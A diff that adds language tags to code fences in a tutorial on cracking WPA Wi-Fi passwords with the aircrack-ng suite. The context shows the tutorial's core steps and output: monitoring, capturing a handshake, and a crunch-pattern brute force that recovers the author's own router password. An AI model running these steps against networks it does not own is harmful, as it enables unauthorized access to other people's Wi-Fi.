@@ -61,7 +61,7 @@ $ airmon-ng check wlan0
 
 You'll get an output similar to the following:
 
-```
+```text
 Found 3 processes that could cause trouble.
 If airodump-ng, aireplay-ng or airtun-ng stops working after
 a short period of time, you may want to run 'airmon-ng check kill'
@@ -84,7 +84,7 @@ $ airodump-ng wlan0
 
 Your terminal screen will fill up with something like this:
 
-```
+```text
  CH 10 ][ Elapsed: 0 s ][ 2019-09-27 21:57
 
  BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
@@ -131,7 +131,7 @@ airodump-ng -c 7 -w SCAN_OUTPUT --bssid 7C:B1:DF:B9:12:59 wlan0
 
 Here's the output:
 
-```
+```text
  CH  7 ][ Elapsed: 24 s ][ 2019-09-27 22:05
 
  BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
@@ -161,7 +161,7 @@ The BSSID we specify is that of the access point. It is possible to limit the am
 
 The output for the `aireplay-ng` command will look like this:
 
-```
+```text
 03:24:06  Waiting for beacon frame (BSSID: 7C:B1:DF:B9:12:59) on channel 7
 NB: this attack is more effective when targeting
 a connected wireless client (-c <client's mac>).
@@ -181,7 +181,7 @@ a connected wireless client (-c <client's mac>).
 
 Your terminal screen will continue to fill with these messages. Keep the command running until you see a `WPA handshake: XX:XX:XX:XX:XX:XX` message on the upper right of the first window running the `airodump-ng` command. That window will look as follows (notice the message on the upper right):
 
-```
+```text
  CH  7 ][ Elapsed: 1 min ][ 2019-09-28 03:25 ][ WPA handshake: 7C:B1:DF:B9:12:59
 
  BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
@@ -207,7 +207,7 @@ aircrack-ng -w wordlist.txt SCAN_OUTPUT.cap
 
 In my case, I used a short wordlist of 4800 passwords to try and crack the handshake. I was not able to find the key, but this is what the output will look like:
 
-```
+```text
                               Aircrack-ng 1.5.2
 
       [00:00:00] 4800/4799 keys tested (5047.82 k/s)
@@ -245,7 +245,7 @@ This will be very slow, as the program will attempt every 14-character letter an
 
 In my case, my router has the default password of `pinkcoconut165`. With this knowledge, I can specify further. Instead of attempting a random mix of letters and numbers, I can test for a specific arrangement of letters/numbers. Obviously, this would not be known if we were attacking a completely unknown access point, but I want to demonstrate what a successful crack looks like. Using the `-t` option we can specify a pattern. Here's the description from the `man` page:
 
-```
+```text
 -t @,%^
       Specifies a pattern, eg: @@god@@@@ where the only the @'s, ,'s, %'s, and ^'s will change.
       @ will insert lower case characters
@@ -268,7 +268,7 @@ crunch 14 14 -t pinkcoconut%%% | aircrack-ng -w - SCAN_OUTPUT.cap -e Lower\ The\
 
 Success! The password has been found:
 
-```
+```text
                               Aircrack-ng 1.5.2
 
 
